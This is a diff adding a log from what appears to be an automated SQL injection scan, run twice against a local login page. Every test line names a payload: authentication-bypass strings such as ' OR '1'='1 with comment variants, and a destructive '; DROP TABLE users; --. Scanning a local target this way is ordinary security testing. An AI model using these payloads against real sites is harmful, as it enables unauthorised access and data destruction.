@@ -1,0 +1,42 @@
+2025-09-16 15:48:49,522 - INFO - Crawling: http://localhost:8080/login.php
+2025-09-16 15:48:50,532 - INFO - Results saved to crawler_output.json
+2025-09-16 15:48:50,532 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR '1'='1
+2025-09-16 15:48:51,587 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR '1'='1' -- 
+2025-09-16 15:48:52,643 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 1=1--
+2025-09-16 15:48:53,695 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 1=1#
+2025-09-16 15:48:54,751 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 1=1/*
+2025-09-16 15:48:55,807 - INFO - Testing form at http://localhost:8080/login.php with payload: '; DROP TABLE users; --
+2025-09-16 15:48:56,860 - INFO - Testing form at http://localhost:8080/login.php with payload: " OR "1"="1
+2025-09-16 15:48:57,914 - INFO - Testing form at http://localhost:8080/login.php with payload: " OR 1=1--
+2025-09-16 15:48:58,971 - INFO - Testing form at http://localhost:8080/login.php with payload: " OR 1=1#
+2025-09-16 15:49:00,022 - INFO - Testing form at http://localhost:8080/login.php with payload: " OR 1=1/*
+2025-09-16 15:49:01,078 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 'x'='x
+2025-09-16 15:49:02,138 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 1=1-- -
+2025-09-16 15:49:03,190 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 1=1#
+2025-09-16 15:49:04,241 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 1=1/*
+2025-09-16 15:49:05,294 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 'a'='a
+2025-09-16 15:49:06,347 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 'a'='a' -- 
+2025-09-16 15:49:07,399 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 'a'='a' #
+2025-09-16 15:49:08,450 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 'a'='a' /*
+2025-09-16 15:49:09,504 - INFO - SQL Injection testing completed. Report saved to sqli_report.json
+2025-09-16 15:50:59,131 - INFO - Crawling: http://localhost:8080/login.php
+2025-09-16 15:51:00,139 - INFO - Results saved to crawler_output.json
+2025-09-16 15:51:00,139 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR '1'='1
+2025-09-16 15:51:01,199 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR '1'='1' -- 
+2025-09-16 15:51:02,258 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 1=1--
+2025-09-16 15:51:03,316 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 1=1#
+2025-09-16 15:51:04,370 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 1=1/*
+2025-09-16 15:51:05,426 - INFO - Testing form at http://localhost:8080/login.php with payload: '; DROP TABLE users; --
+2025-09-16 15:51:06,481 - INFO - Testing form at http://localhost:8080/login.php with payload: " OR "1"="1
+2025-09-16 15:51:07,534 - INFO - Testing form at http://localhost:8080/login.php with payload: " OR 1=1--
+2025-09-16 15:51:08,590 - INFO - Testing form at http://localhost:8080/login.php with payload: " OR 1=1#
+2025-09-16 15:51:09,644 - INFO - Testing form at http://localhost:8080/login.php with payload: " OR 1=1/*
+2025-09-16 15:51:10,699 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 'x'='x
+2025-09-16 15:51:11,749 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 1=1-- -
+2025-09-16 15:51:12,804 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 1=1#
+2025-09-16 15:51:13,857 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 1=1/*
+2025-09-16 15:51:14,913 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 'a'='a
+2025-09-16 15:51:15,969 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 'a'='a' -- 
+2025-09-16 15:51:17,021 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 'a'='a' #
+2025-09-16 15:51:18,082 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 'a'='a' /*
+2025-09-16 15:51:19,137 - INFO - SQL Injection testing completed. Report saved to sqli_report.json
